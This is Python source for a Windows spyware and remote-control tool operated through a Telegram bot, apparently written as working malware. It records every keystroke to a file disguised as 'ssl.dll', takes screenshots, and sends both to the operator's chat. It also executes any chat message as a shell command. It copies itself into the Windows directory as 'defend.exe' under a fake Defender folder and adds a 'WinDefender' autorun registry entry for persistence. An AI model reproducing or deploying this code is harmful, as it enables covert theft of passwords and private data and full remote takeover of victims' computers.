from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from win32api import GetWindowsDirectory as DirWinows, CopyFile as copyfile
from pynput.keyboard import Key, Listener
import  sys, os, inspect, time
from pyautogui import screenshot
import threading

TELEGRAM_API_TOKEN = 'your_bot_token'

# Threading decorator
def thread(func):
    def wrap(*args, **kwargs):
        t = threading.Thread(target=func, args=args, kwargs=kwargs)
        t.start()
    return wrap
updater = Updater(token=TELEGRAM_API_TOKEN)
dispatcher = updater.dispatcher

# command /start
def startCommand(bot,update):
    print("STR")
    tex = """ Привет ето  бот, доступни
твкие команды /skrin, /getLog . """
    print('ok')
    ci = update.message.chat_id
    print('ok '+str(ci))
    bot.send_message(chat_id = ci, text=tex)

#text messege telegram 
def textMessage(bot, update):
    ci = update.message.chat_id
    print('cmd_mod start')
    cmd = update.message.text
    print(cmd)
    cmd = cmd.strip()
    os.system(cmd)
    print('ok')
    bot.send_message(cgat_id=ci, text = 'ok')
    pass

def get_script_dir(fp=False,follow_symlinks=True):
    if getattr(sys, 'frozen', False): # py2exe, PyInstaller, cx_Freeze
        path = os.path.abspath(sys.executable)
    else:
        path = inspect.getabsfile(get_script_dir)
    if follow_symlinks:
        path = os.path.realpath(path)
    if fp:
        return path
    return os.path.dirname(path)
def sendScreen(bot, update):
    name = os.path.join(get_script_dir(), 'sc.png')
    ci = update.message.chat_id
    mg = screenshot(name)
    bot.send_photo(chat_id=ci, photo=open(name, 'rb'))

def getKeyLog(bot, update):
    print('STR Get file')
    name = os.path.join(get_script_dir(), 'ssl.dll')
    print(name)
    fl = 'ab'
    if not os.path.isfile(name):
        fl = 'wb'
    ci = update.message.chat_id
    print(ci)
    bot.send_document(chat_id=ci, document=open(name, 'rb'))
    print('ok key log')
def on_press(key):
    log_dir = os.path.join(get_script_dir(),'ssl.dll')
    fl = 'ab'
    if not os.path.isfile(log_dir):
        fl = 'wb'
    #key = bytes(key, ecoding='utf-8')
    with open(log_dir, fl) as f:
        ti = time.strftime("%H-%M-%S %d%m%Y")
        st =  bytes("{0} - {1}\n".format(ti, key), encoding='utf-8')
        f.write(st)

def cmd_win(bot, update):
    print("STR cmd win")
    ci = update.message.chat_id
    cmd_mod = True
    bot.send_message(chat_id=ci,text="CMD Mode Active!")

def start_telegram_bot():
    start_command_handler = CommandHandler('start', startCommand)
    scrin_cmd = CommandHandler('skrin', sendScreen)
    get_log_cmd = CommandHandler('getLog', getKeyLog)
    comand_line = CommandHandler('comand_line', cmd_win)
    text_message_handler = MessageHandler(Filters.text, textMessage)
    dispatcher.add_handler(comand_line)
    dispatcher.add_handler(get_log_cmd)
    dispatcher.add_handler(scrin_cmd)
    dispatcher.add_handler(start_command_handler)
    dispatcher.add_handler(text_message_handler)
    updater.start_polling(clean=True)
    print('Bot started....   ok!')
@thread
def start_keyloger():
    with Listener(on_press=on_press) as listener:
        listener.join()
file_script = get_script_dir(True)
print(file_script)
win_dir = os.path.join(DirWinows(),'Defenderx82x64')
if not os.path.isdir(win_dir):
    os.mkdir(win_dir)
win_file = os.path.join(win_dir, 'defend.exe')
if not os.path.isfile(win_file) and win_file != file_script:
    copyfile(file_script, win_file,0)
@thread
def add_autorun_windows():
    cm = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinDefender /t REG_SZ /d {0} /f'.format(win_file)
    while True:
        os.system(cm)
        time.sleep(20)
def main():
    print('Started bot')
    try:
        add_autorun_windows()
        start_telegram_bot()
        start_keyloger()
    except:
        print('Restart bot')
        time.sleep(5)
        main()
if __name__ == '__main__':
    main()
